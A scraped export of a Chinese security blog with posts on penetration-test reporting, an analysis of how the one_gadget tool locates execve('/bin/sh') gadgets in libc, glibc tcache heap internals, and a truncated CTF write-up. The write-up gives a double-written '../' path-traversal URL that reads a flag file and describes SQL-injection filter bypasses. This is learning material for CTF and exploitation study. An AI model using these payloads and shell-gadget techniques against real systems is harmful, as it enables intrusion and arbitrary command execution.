Writing（撰写渗透测试报告）完成渗透测试之后，需要对这次渗透测试撰写渗透测试报告。明确地写出哪里存在漏洞，以及漏洞修补的方法，以便于网站管理员根据渗透测试报告修补这些漏洞和风险，防止被黑客攻击。 ComplementIP 配置直接在文件中配置123456sudo vim /etc/network/interfaces# auto eth0 # 自动启用第一块网卡# ifconf eth0 inet static# address 192.168.1.2 # IP地址# netmask 255.255.255.0 # 子网掩码# gateway 192.168.1.1 # 网关 命令行配置1234sudo ifconfig ens33 192.168.10.163 netmask 255.255.255.0 # 设置IP和掩码sudo route add default gw 192.168.10.1 # 设置网关sudo echo \"nameserver 192.168.10.1\" &gt;&gt; /etc/resolv.conf # 设置DNSsudo /etc/init.d/networking restart # 重启服务 Common Vulnerabilities输入输出验证不充分 输入输出验证 SQL 注入 跨站脚本攻击（XSS） 跨站请求伪造（CSRF） 文件上传常见问题 文件下载漏洞 设计缺陷 非授权对象引用 纵向越权 找回密码漏洞 环境缺陷 解析漏洞 IIS 5.x/6.0 解析漏洞 IIS 7.0/IIS 7.5/ Nginx &lt;8.03 畸形解析漏洞 Nginx &lt;8.03 空字节代码执行漏洞 Apache 解析漏洞 其他 Referenceshttps://blog.csdn.net/qq_36119192/article/details/84674109https://blog.csdn.net/wsclinux/article/details/73177091http://blog.nsfocus.net/common-vulnerability-verify/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"one_gadget源码分析","slug":"one-gadget源码分析","date":"2019-05-16T01:44:57.000Z","updated":"2019-08-26T05:52:16.792Z","comments":true,"path":"2019/05/16/one-gadget源码分析/","link":"","permalink":"qianfei11.coding.me/2019/05/16/one-gadget源码分析/","excerpt":"不清楚one_gadget具体原理是什么，打算看一下源码，做了一点草率的分析。","text":"不清楚one_gadget具体原理是什么，打算看一下源码，做了一点草率的分析。 Structure目录结构大概是这样： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122$ tree.├── Gemfile├── Gemfile.lock├── LICENSE├── README.md├── README.tpl.md├── Rakefile├── appveyor.yml├── bin│ └── one_gadget├── builds_list├── examples│ ├── aarch64.png│ ├── from_build_id.png│ ├── i386.png│ ├── near.png│ ├── script.png│ └── x86_64.png├── lib│ ├── one_gadget│ │ ├── abi.rb│ │ ├── builds│ │ │ ├── libc-2.19-01e14462fc6097604edd54a2ee63664c65b2c12b.rb│ │ │ ├── ...│ │ │ ├── libc-2.19-fe76e177d397e9bdccf270232cc7e3a06e84aeb1.rb│ │ │ ├── libc-2.20-024df4febc9c789a8eeb052385d5e780b98a379f.rb│ │ │ ├── ...│ │ │ ├── libc-2.20-f53b8ad377a1988dcf6329bbdfa7b1201431656e.rb│ │ │ ├── libc-2.21-04f18629ef42b062ed0c8f60d5bfaa40a7d28ef7.rb│ │ │ ├── ...│ │ │ ├── libc-2.21-fe668be19c2dadb3cef5e6eafb6796acabf0b8f1.rb│ │ │ ├── libc-2.21.90-d8785e62882096798b9a47645c401e2db0c3da87.rb│ │ │ ├── libc-2.21.90-ec2edee6fe6141b914f74b6d3541e986c1995420.rb│ │ │ ├── libc-2.22-056b23405739592e947a92cb210791fbfe9d9938.rb│ │ │ ├── ...│ │ │ ├── libc-2.22-ff7fbdaaef014460825b4ef5848e86834aa3880c.rb│ │ │ ├── libc-2.23-012683a92d161c37d51d89711c4870ba30904c3d.rb│ │ │ ├── ...│ │ │ ├── libc-2.23-ffb3662a7bc5e136fa8f464fc14ec23efb8d1817.rb│ │ │ ├── libc-2.23.90-203feaf8a7e40cef8a75568a406a22fdeda94f8b.rb│ │ │ ├── ...│ │ │ ├── libc-2.23.90-f149edaf4dee34b38f831bf0914af2ecf0a1a317.rb│ │ │ ├── libc-2.24-024385baa7aaf9c62ae336e896bcf245dda0fc01.rb│ │ │ ├── ...│ │ │ ├── libc-2.24-fe976940471b3f683eeebb268f095b7ff1c898c1.rb│ │ │ ├── libc-2.25-58c735bc7b19b0aeb395cce70cf63bd62ac75e4a.rb│ │ │ ├── ...│ │ │ ├── libc-2.25-eae5038c2b9ae67d9eda345aa9fbe0a7185ab436.rb│ │ │ ├── libc-2.26-1c39b3b3faa2a2cbb0fa0b6845b29332562262d3.rb│ │ │ ├── ...│ │ │ ├── libc-2.26-fb587bc4429e7d1b0de31a3b9ee8ae78ee797eb0.rb│ │ │ ├── libc-2.27-0e188ec5f09c187a7a92784d4b97aa251b15a93c.rb│ │ │ ├── ...│ │ │ ├── libc-2.27-b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0.rb│ │ │ ├── libc-2.28-44f5a3efb0e5733fa9d97e690cb36cd4c682bcdb.rb│ │ │ ├── ...│ │ │ └── libc-2.28-6ee9454b96efa9e343f9e8105f2fa4529265ea05.rb│ │ ├── cli.rb│ │ ├── emulators│ │ │ ├── aarch64.rb│ │ │ ├── amd64.rb│ │ │ ├── i386.rb│ │ │ ├── instruction.rb│ │ │ ├── lambda.rb│ │ │ ├── processor.rb│ │ │ └── x86.rb│ │ ├── error.rb│ │ ├── fetcher.rb│ │ ├── fetchers│ │ │ ├── aarch64.rb│ │ │ ├── amd64.rb│ │ │ ├── base.rb│ │ │ ├── i386.rb│ │ │ └── x86.rb│ │ ├── gadget.rb│ │ ├── helper.rb│ │ ├── logger.rb│ │ ├── one_gadget.rb│ │ ├── update.rb│ │ └── version.rb│ └── one_gadget.rb├── one_gadget.gemspec├── spec│ ├── bin_spec.rb│ ├── cli_spec.rb│ ├── data│ │ ├── aarch64-libc-2.23.so│ │ ├── aarch64-libc-2.24.so│ │ ├── aarch64-libc-2.27.so│ │ ├── filename$with+special&amp;keys│ │ ├── libc-2.19-cf699a15caae64f50311fc4655b86dc39a479789.so│ │ ├── libc-2.19-fd51b20e670e9a9f60dc3b06dc9761fb08c9358b.so│ │ ├── libc-2.23-60131540dadc6796cab33388349e6e4e68692053.so│ │ ├── libc-2.23-926eb99d49cab2e5622af38ab07395f5b32035e9.so│ │ ├── libc-2.24-8cba3297f538691eb1875be62986993c004f3f4d.so│ │ ├── libc-2.26-2104f3d4ad5cf68603afbe7ba1a17f5ac99c5988.so│ │ ├── libc-2.26-ddcc13122ddbfe5e5ef77d4ebe66d124ae5762c2.so│ │ ├── libc-2.26-f65648a832414f2144ce795d75b6045a1ec2e252.so│ │ ├── libc-2.27-63b3d43ad45e1b0f601848c65b067f9e9b40528b.so│ │ ├── libc-2.27-b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0.so│ │ └── test_near_file.elf│ ├── emulators│ │ ├── aarch64_spec.rb│ │ ├── amd64_spec.rb│ │ ├── i386_spec.rb│ │ ├── instruction_spec.rb│ │ └── lambda_spec.rb│ ├── gadget_spec.rb│ ├── helper_spec.rb│ ├── one_gadget_aarch64_spec.rb│ ├── one_gadget_amd64_spec.rb│ ├── one_gadget_i386_spec.rb│ ├── spec_helper.rb│ └── update_spec.rb└── tasks ├── builds │ ├── generate.rake │ └── list.rake └── readme.rake12 directories, 787 files Analysis以下的分析仅仅是我个人的想法，因为我也不了解 ruby，只是单纯地推测代码的含义。如果有错误，欢迎大佬指正。接下来我逐个按照文件来进行分析： bin存放了one_gadget可执行文件 123456#!/usr/bin/env ruby# frozen_string_literal: truerequire 'one_gadget/cli'exit OneGadget::CLI.work(ARGV.dup) 也可以看出lib/one_gadget/cli.rb中肯定调用了具体的算法 examples不同架构下one_gadget的执行效果图 liblib下分为一个one_gadget的文件夹和一个源文件one_gadget.rb one_gadget这里应该就是one_gadget的源码，先看lib/one_gadget/cli.rb，其中定义了一个work函数，也就是二进制文件中调用的部分： 12345678910111213141516171819202122... # Main method of CLI. # @param [Array&lt;String&gt;] argv # Command line arguments. # @return [Boolean] # Whether the command execute successfully. # @example # CLI.work(%w[--help]) # # usage message # #=&gt; true # CLI.work(%w[--version]) # # version message # #=&gt; true # @example # CLI.work([]) # # usage message # #=&gt; false # @example # CLI.work(%w[-b b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0 -r]) # # 324293 324386 1090444 # #=&gt; true... 看一下注释大概知道了就是解析输入的参数，然后再对不同的函数进行调用 lib/one_gadget/helper.rb中定义了对输入文件信息的一些判断和一些美化操作，以architecture函数为例，就是对使用的指令架构做了一个判断： 123456789101112131415161718192021222324# Fetch the ELF archiecture of +file+.# @param [String] file The target ELF filename.# @return [Symbol]# Currently supports amd64, i386, arm, aarch64, and mips.# @example# Helper.architecture('/bin/cat')# #=&gt; :amd64def architecture(file) return :invalid unless File.exist?(file) f = File.open(file) str = ELFTools::ELFFile.new(f).machine &#123; 'Advanced Micro Devices X86-64' =&gt; :amd64, 'Intel 80386' =&gt; :i386, 'ARM' =&gt; :arm, 'AArch64' =&gt; :aarch64, 'MIPS R3000' =&gt; :mips &#125;[str] || :unknownrescue ELFTools::ELFError # not a valid ELF :invalidensure f&amp;.closeend 接下来直接看看关键的函数lib/one_gadget/one_gadget.rb。这里面调用了找one_gadget的源文件fetcher.rb 123456789101112131415161718192021...require 'one_gadget/fetcher'... # The man entry of gem +one_gadget+. # If want to find gadgets from file, it will search gadgets by its # build id first.... def gadgets(file: nil, build_id: nil, details: false, force_file: false, level: 0) ret = if build_id OneGadget::Fetcher.from_build_id(build_id) || OneGadget::Logger.not_found(build_id) else from_file(OneGadget::Helper.abspath(file), force: force_file) end ret = refine_gadgets(ret, level) ret = ret.map(&amp;:offset) unless details ret rescue OneGadget::Error::Error =&gt; e OneGadget::Logger.error(\"#&#123;e.class.name.split('::').last&#125;: #&#123;e.message&#125;\") [] end... 可以看到注释里大概说了一下过程，这个函数就是one_gadget的“main”函数，会调用fetcher.rb中的函数，去builds文件夹里已经找到的one_gadget是否符合 接下来看lib/one_gadget/fetcher.rb，各个架构下的情况分别调用了各自对应的文件 1234567891011121314151617181920212223...require 'one_gadget/fetchers/aarch64'require 'one_gadget/fetchers/amd64'require 'one_gadget/fetchers/i386'require 'one_gadget/gadget'... def from_build_id(build_id, remote: true) OneGadget::Helper.verify_build_id!(build_id) OneGadget::Gadget.builds(build_id, remote: remote) end... def from_file(file) arch = OneGadget::Helper.architecture(file) klass = &#123; aarch64: OneGadget::Fetcher::AArch64, amd64: OneGadget::Fetcher::Amd64, i386: OneGadget::Fetcher::I386 &#125;[arch] raise Error::UnsupportedArchitectureError, arch if klass.nil? trim_gadgets(klass.new(file).find) end... 然后是lib/one_gadget/fetchers/base.rb，每种架构下获取one_gadget的方法都以这个函数为基础 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566... def resolve(processor) call = processor.registers[processor.pc].to_s # This costs cheaper, so check first. # check call execve / execl return unless %w[execve execl].any? &#123; |n| call.include?(n) &#125; # check first argument contains /bin/sh # since the logic is different between amd64 and i386, # invoke str_bin_sh? for checking return unless str_bin_sh?(processor.argument(0).to_s) if call.include?('execve') resolve_execve(processor) elsif call.include?('execl') resolve_execl(processor) end end def resolve_execve(processor) # arg[1] == NULL || [arg[1]] == NULL # arg[2] == NULL || [arg[2]] == NULL || arg[2] == envp arg1 = processor.argument(1).to_s arg2 = processor.argument(2).to_s cons = processor.constraints cons &lt;&lt; check_execve_arg(processor, arg1) return nil unless cons.all? envp = 'environ' return nil unless check_envp(processor, arg2) do |c| cons &lt;&lt; c envp = arg2 end &#123; constraints: cons, effect: %(execve(\"/bin/sh\", #&#123;arg1&#125;, #&#123;envp&#125;)) &#125; end # arg[1] == NULL || [arg[1]] == NULL def check_execve_arg(processor, arg) if arg.start_with?(processor.sp) # arg = sp+&lt;num&gt; # in this case, the only constraint is [sp+&lt;num&gt;] == NULL num = Integer(arg[processor.sp.size..-1]) slot = processor.stack[num].to_s return if global_var?(slot) \"#&#123;slot&#125; == NULL\" else \"[#&#123;arg&#125;] == NULL || #&#123;arg&#125; == NULL\" end end def check_envp(processor, arg) # if str starts with [[ and is global var, # believe it is environ # if starts with [[ but not global, drop it. return global_var?(arg) if arg.start_with?('[[') # normal cons = check_execve_arg(processor, arg) return nil if cons.nil? yield cons end... def str_bin_sh?(_str); raise NotImplementedError end... 可以看到先是找到字符串&quot;/bin/sh&quot;，然后检查是否call了execve，最后再检查另外两个参数的情况，最后就能得到one_gadget： 123456789101112λ one_gadget libc.so0x3c0cb execve(\"/bin/sh\", rsp+0x20, environ)constraints: [rsp+0x20] == NULL0xcb795 execve(\"/bin/sh\", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0xcb79a execve(\"/bin/sh\", rsi, environ)constraints: [rsi] == NULL || rsi == NULL spec这里放了一些常用 libc 的one_gadget tasks应该是一些编译的选项设置 Complement分析完之后再看看作者 david942j 的介绍 64 Bit这里首先以 64 位下的libc-2.23.so为例 12λ file /lib/x86_64-linux-gnu/libc-2.23.so/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/l, BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a, for GNU/Linux 2.6.32, stripped 先看看能够找到的one_gadget： 12345678910111213141516λ one_gadget /lib/x86_64-linux-gnu/libc-2.23.so0x45216 execve(\"/bin/sh\", rsp+0x30, environ)constraints: rax == NULL0x4526a execve(\"/bin/sh\", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 以第二个one_gadget为例，看一下这部分反汇编的代码： 123456789101112λ objdump -d /lib/x86_64-linux-gnu/libc-2.23.so... 4526a: 48 8b 05 47 ec 37 00 mov rax,QWORD PTR [rip+0x37ec47] # 3c3eb8 &lt;_IO_file_jumps@@GLIBC_2.2.5+0x7d8&gt; 45271: 48 8d 3d df 7a 14 00 lea rdi,[rip+0x147adf] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; 45278: 48 8d 74 24 30 lea rsi,[rsp+0x30] 4527d: c7 05 19 12 38 00 00 mov DWORD PTR [rip+0x381219],0x0 # 3c64a0 &lt;__abort_msg@@GLIBC_PRIVATE+0x8c0&gt; 45284: 00 00 00 45287: c7 05 13 12 38 00 00 mov DWORD PTR [rip+0x381213],0x0 # 3c64a4 &lt;__abort_msg@@GLIBC_PRIVATE+0x8c4&gt; 4528e: 00 00 00 45291: 48 8b 10 mov rdx,QWORD PTR [rax] 45294: e8 d7 74 08 00 call cc770 &lt;execve@@GLIBC_2.2.5&gt;... 第45271行的汇编等价于rdi = libc_base + 0x18cd57，可以看到libc_base + 0x18cd57就是字符串/bin/sh的位置： 12λ strings -tx /lib/x86_64-linux-gnu/libc-2.23.so | grep \"/bin/sh\" 18cd57 /bin/sh 再grep一下可以看到有很多类似的gadgets： 1234567891011121314151617λ objdump -d /lib/x86_64-linux-gnu/libc-2.23.so | grep \"18cd57\" 45271: 48 8d 3d df 7a 14 00 lea rdi,[rip+0x147adf] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; 6f5a6: 48 8d 3d aa d7 11 00 lea rdi,[rip+0x11d7aa] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cce31: 48 8d 05 1f ff 0b 00 lea rax,[rip+0xbff1f] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cd078: 48 8d 0d d8 fc 0b 00 lea rcx,[rip+0xbfcd8] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cd0f3: 48 8d 3d 5d fc 0b 00 lea rdi,[rip+0xbfc5d] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; cd1c8: 48 8d 3d 88 fb 0b 00 lea rdi,[rip+0xbfb88] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f01b0: 48 8d 05 a0 cb 09 00 lea rax,[rip+0x9cba0] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f02b0: 48 8d 3d a0 ca 09 00 lea rdi,[rip+0x9caa0] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f02c4: 48 8d 05 8c ca 09 00 lea rax,[rip+0x9ca8c] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f0fcc: 48 8d 05 84 bd 09 00 lea rax,[rip+0x9bd84] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f10fc: 48 8d 05 54 bc 09 00 lea rax,[rip+0x9bc54] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f1153: 48 8d 3d fd bb 09 00 lea rdi,[rip+0x9bbfd] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f6276: 48 8d 3d da 6a 09 00 lea rdi,[rip+0x96ada] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f6643: 48 8d 05 0d 67 09 00 lea rax,[rip+0x9670d] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; f66f0: 48 8d 3d 60 66 09 00 lea rdi,[rip+0x96660] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; ff8ae: 48 8d 05 a2 d4 08 00 lea rax,[rip+0x8d4a2] # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt; 再回到上面的汇编片段，第45278行等价于rsi = rsp + 0x30，那么基本可以判断出上面这一部分的gadget等价于execve(&quot;/bin/sh&quot;, rsp+0x30, environ);，可以成功 Get Shell 那么 64 位下one_gadget的实现原理就可以总结成三步： 找到有字符串&quot;/bin/sh&quot;的gadgets 筛选出附近有调用execve的gadgets 最后找出gadget中含有类似lea rsi,[rsp+0x??]的即为one_gadget 32Bit接下来看看 32 位下的libc-2.23.so，找one_gadget的方法就不太一样了： 12λ file /lib/i386-linux-gnu/libc-2.23.so/lib/i386-linux-gnu/libc-2.23.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=2052ef79d1bb69a8f5c5340eee984f2659b75e39, for GNU/Linux 2.6.32, stripped 可以找到很多gadgets： 123456789101112131415161718192021222324252627282930λ one_gadget /lib/i386-linux-gnu/libc-2.23.so0x3ac5c execve(\"/bin/sh\", esp+0x28, environ)constraints: esi is the GOT address of libc [esp+0x28] == NULL0x3ac5e execve(\"/bin/sh\", esp+0x2c, environ)constraints: esi is the GOT address of libc [esp+0x2c] == NULL0x3ac62 execve(\"/bin/sh\", esp+0x30, environ)constraints: esi is the GOT address of libc [esp+0x30] == NULL0x3ac69 execve(\"/bin/sh\", esp+0x34, environ)constraints: esi is the GOT address of libc [esp+0x34] == NULL0x5fbc5 execl(\"/bin/sh\", eax)constraints: esi is the GOT address of libc eax == NULL0x5fbc6 execl(\"/bin/sh\", [esp])constraints: esi is the GOT address of libc [esp] == NULL 这里以第四个one_gadget为例： 123456789101112131415λ objdump -d /lib/i386-linux-gnu/libc-2.23.so... 3ac69: 8b 86 48 ff ff ff mov eax,DWORD PTR [esi-0xb8] 3ac6f: 83 c4 0c add esp,0xc 3ac72: c7 86 20 16 00 00 00 mov DWORD PTR [esi+0x1620],0x0 3ac79: 00 00 00 3ac7c: c7 86 24 16 00 00 00 mov DWORD PTR [esi+0x1624],0x0 3ac83: 00 00 00 3ac86: ff 30 push DWORD PTR [eax] 3ac88: 8d 44 24 2c lea eax,[esp+0x2c] 3ac8c: 50 push eax 3ac8d: 8d 86 0b 9a fa ff lea eax,[esi-0x565f5] 3ac93: 50 push eax 3ac94: e8 47 5b 07 00 call b07e0 &lt;execve@@GLIBC_2.0&gt;... 32 位相较于 64 位有两个不同点： 32 位下通过[&lt;reg&gt;-0x??]（寄存器加立即数，即寄存器寻址方式）来访问只读数据 32 位下函数的传参通过栈来实现，而不是寄存器 最后 32 位下的one_gadget通过一个简单的符号执行实现，最后找到的one_gadget类似execve(&quot;/bin/sh&quot;, argv, environ);的形式。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"}]},{"title":"Tcache Makes Heap Exploitation Easy Again","slug":"Tcache-Makes-Heap-Exploitation-Easy-Again","date":"2019-05-15T06:07:46.000Z","updated":"2019-08-26T05:50:56.432Z","comments":true,"path":"2019/05/15/Tcache-Makes-Heap-Exploitation-Easy-Again/","link":"","permalink":"qianfei11.coding.me/2019/05/15/Tcache-Makes-Heap-Exploitation-Easy-Again/","excerpt":"校赛花了点时间临时学了一下tcache，整理一下基础知识。","text":"校赛花了点时间临时学了一下tcache，整理一下基础知识。 Intro全称是Thread Local Caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高 AnalysisStructure123456789101112131415161718/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; // TCACHE_MAX_BINS = 64 tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; tcache_perthread_struct是整个tcache的管理结构，总共有 64 个tcache_entry。tcache和fast bin有点像，都是单向链表结构，每个tcache_entry中有一个next指针，指向每一个大小相同的下一个chunk。counts记录每个tcache_entry中chunk的个数，一个tcache_entry上最多能有 7 个chunk。 Put tcachetcache中最重要的操作之一tcache_put： 1234567891011121314151617static __thread bool tcache_shutting_down = false;static __thread tcache_perthread_struct *tcache = NULL;/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; 把一个chunk放到指定的tcache_entry中。然后还会检测一下一个tcache_entry上的chunk个数是否超过规定的TCACHE_MAX_BINS。接下来把指定tcache_entry的key设成tcache，同时把指定tcache_entry的next指向对应的entries，再把对应的entries设成当前的tcache_entry。最后把counts的数目加一。 Get tcachetcache中最重要的操作之一tcache_get： 12345678910111213/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;counts[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; 基本上就是和tcache_put相反，把链表上的元素取下来的过程。中间还检测了一个tcache_entry上的chunk个数是否小于 0 或者大于TCACHE_MAX_BINS。 _int_malloc新增了tcache之后对malloc产生的变化 fast bin1234567891011121314151617181920212223242526272829303132333435/* ------------------------------ malloc ------------------------------ */static void *_int_malloc (mstate av, size_t bytes)&#123;...#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif...#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif... 在相应fast bin找到合适的chunk后，就把该chunk从fast bin里面拿下来 然后把相应fast bin里面剩下的chunk全都放到tcache里面，直到tcache-&gt;entries[tc_idx]满了 最后返回一开始拿到的chunk给用户 如果fast bin不能分配，则进入small bin的分配流程 small bin1234567891011121314151617181920212223242526...#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif... 和fast bin是类似的操作，在大小对应的small bin里面找到chunk 把chunk从链表上取下来 然后把该small bin 里面剩下的放入到tcache，直到tcache-&gt;entries[tc_idx]满 如果small bin也没能分配，进入unsorted bin unsorted bin12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849...#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif...#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif...#if USE_TCACHE &#125;#endif...#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif...#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif...&#125; 在遍历unsorted bin的时候，如果找到大小刚好满足的bin，不会立刻返回，而是把这个bin放入tcache里面，并且设置return_cached=1，表示有大小适配的unsorted bin进入了tcache 如果大小不是正好满足需要，就走一般的流程，把bin放到相应的small bin或者large bin里面 遍历unsorted bin的最后，会根据return_cached判断是否有大小适配的unsorted bin进入了tcache，mp_.tcache_unsorted_limit默认为 0，所以不会进入分支，这样就会把所有的unsorted bin都放入到tcache 遍历完unsorted bin后，根据return_cached判断tcache里面是否有合适的chunk，有的话就可以返回了 否则由large bin，top chunk来分配 _int_free新增了tcache之后对free产生的变化 12345678910111213141516171819202122232425262728293031323334353637383940/* ------------------------------ free ------------------------------ */static void_int_free (mstate av, mchunkptr p, int have_lock)&#123;...#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache)) &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr (\"free(): double free detected in tcache 2\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125; &#125;#endif...&#125; 首先就是获取要释放的chunk的大小，然后判断大小是否符和规范（或是否对齐等等)，如果合规就看tcache-&gt;counts[tc_idx]是否已经满了，如果没有满就直接放入tcache，然后返回 否则就和没有 tcache 是一样的处理 在free的时候，会检测下一个chunk的PREV_INUSE位，但是如果chunk被放入了tcache，next-&gt;PREV_INUSE位不会被修改，还是会标志为in_used，所以我们可以多次释放同一个chunk Referenceshttps://code.woboq.org/userspace/glibc/malloc/malloc.chttp://p4nda.top/2018/03/20/tcache/http://tukan.farm/2017/07/08/tcache/https://www.secpulse.com/archives/71958.htmlhttps://medium.com/@ktecv2000/tcache-exploitation-871044f8b210","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"2019-ZJGSUCTF","slug":"2019-ZJGSUCTF","date":"2019-05-12T15:45:39.000Z","updated":"2019-08-26T01:16:05.627Z","comments":true,"path":"2019/05/12/2019-ZJGSUCTF/","link":"","permalink":"qianfei11.coding.me/2019/05/12/2019-ZJGSUCTF/","excerpt":"一晃一年过去了，今年的个人赛肝的有点累。","text":"一晃一年过去了，今年的个人赛肝的有点累。 Web100 分的题目就不想名字了任意文件读取，../被过滤了，要双写绕过： 1http://10.21.13.190:22222/index.php?dir=.....///.....///.....///flag/flag1.txt 我苦心锻炼了三年sql 注入，过滤了and、or（双写绕过）以及空格（%a0）： 